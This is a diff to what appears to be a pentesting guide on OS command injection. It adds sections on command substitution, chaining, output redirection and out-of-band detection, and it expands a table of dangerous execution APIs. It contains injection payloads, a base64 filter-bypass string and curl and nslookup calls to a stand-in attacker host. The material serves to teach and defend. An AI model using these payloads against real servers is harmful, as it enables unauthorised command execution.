@@ -120,6 +120,54 @@ Note that, `;` will work on Unix-based systems and PowerShell. However, it will 
 Furthermore, you can use Bash command substitution `$(cmd)` or &grave;`cmd`&grave; to execute commands on Unix-based systems.  
 Additionally, Linux file descriptors such as `>(cmd)`, `<(cmd)` can also be used.
 
+## Additional Command Injection Techniques
+
+Attackers may leverage different techniques to execute operating system commands depending on the environment and filtering mechanisms.
+
+### Command Substitution
+
+Command substitution allows the output of one command to be used as input to another command.
+
+Examples:
+
+```bash
+$(whoami)
+`whoami`
+```
+
+### Command Chaining
+
+Multiple commands can be executed sequentially using command chaining operators.
+
+Examples:
+
+```bash
+cmd1 ; cmd2
+cmd1 && cmd2
+cmd1 || cmd2
+```
+
+### File Redirection
+
+Attackers may redirect command output to files accessible by the web server.
+
+Example:
+
+```bash
+whoami > /var/www/html/output.txt
+```
+
+### Out-of-Band Command Injection
+
+Attackers may use external services to detect command execution.
+
+Examples:
+
+```bash
+curl http://attacker.com
+nslookup attacker.com
+```
+
 ## Filter Evasion
 
 To prevent OS command injection, web developers often use filters. However, these filters are sometimes not properly implemented which allows attackers to bypass them.
@@ -137,7 +185,7 @@ Here is a methodology we can use when we come across a filter:
 
 ### Special Characters Filter Evasion
 
-As previously mentionned, filters can either be applied on special characters, OS commands or both.
+As previously mentioned, filters can either be applied on special characters, OS commands or both.
 To bypass filters applied on special characters, we can use environment variables, Bash brace expansion or URL encoding.
 
 #### URL Encoding
@@ -199,7 +247,7 @@ Let's suppose that `whoami` is blocked by the web server. Therefore, we cannot u
 To bypass this restriction, we will use the base64 encoded format of `whoami` by executing: `echo -n 'whoami' | base64`. This will return `d2hvYW1p`.
 After that, we will send the following payload: `;bash<<<$(base64 -d<<< d2hvYW1p)` in the vulnerable parameter. This should then bypass the server-side filter and allow us to achieve remote command execution.
 
-**Finally, note that you may need to combine different special characters and OS command filter evasion techniques to successfully bypass the filters put it place by the web server.**
+**Finally, note that you may need to combine different special characters and OS command filter evasion techniques to successfully bypass the filters put in place by the web server.**
 
 ## Blind Command Injection
 
@@ -209,37 +257,20 @@ For instance, we can execute `;sleep(5)` and if the web server waits 5 seconds b
 Moreover, we can also **redirect the output of the injected command in the web server's web root**. `;whoami>/var/www/html/poc.txt;`  
 After that, we can execute `curl http://website.com/poc.txt`. If we are able to retrieve the file, we can then confirm that the web server is vulnerable to a blind command injection.
 
-## Code Review Dangerous API
+## Dangerous Command Execution APIs
 
-Be aware of the uses of following API as it may introduce the command injection risks.
+The following APIs in different programming languages can execute operating system commands and may introduce command injection vulnerabilities if used with unsanitized user input.
 
-### Java
-
-- `Runtime.exec()`
-
-### C/C++
-
-- `system`
-- `exec`
-- `ShellExecute`
-
-### Python
-
-- `exec`
-- `eval`
-- `os.system`
-- `os.popen`
-- `subprocess.popen`
-- `subprocess.call`
-
-### PHP
-
-- `system`
-- `shell_exec`
-- `exec`
-- `proc_open`
-- `eval`
-- `passthru`
+| Language | Dangerous APIs |
+|---------|---------------|
+| Java | `Runtime.exec()` |
+| C/C++ | `system()`, `exec()`, `ShellExecute()` |
+| Python | `exec()`, `eval()`, `os.system()`, `os.popen()`, `subprocess.Popen()`, `subprocess.call()` |
+| PHP | `system()`, `shell_exec()`, `exec()`, `proc_open()`, `eval()`, `passthru()` |
+| Node.js | `child_process.exec()`, `execSync()`, `spawn()` |
+| Ruby | `system()`, `exec()`, `Open3.popen3()` |
+| Go | `exec.Command()` |
+| C# | `Process.Start()` |
 
 ## Remediation
 
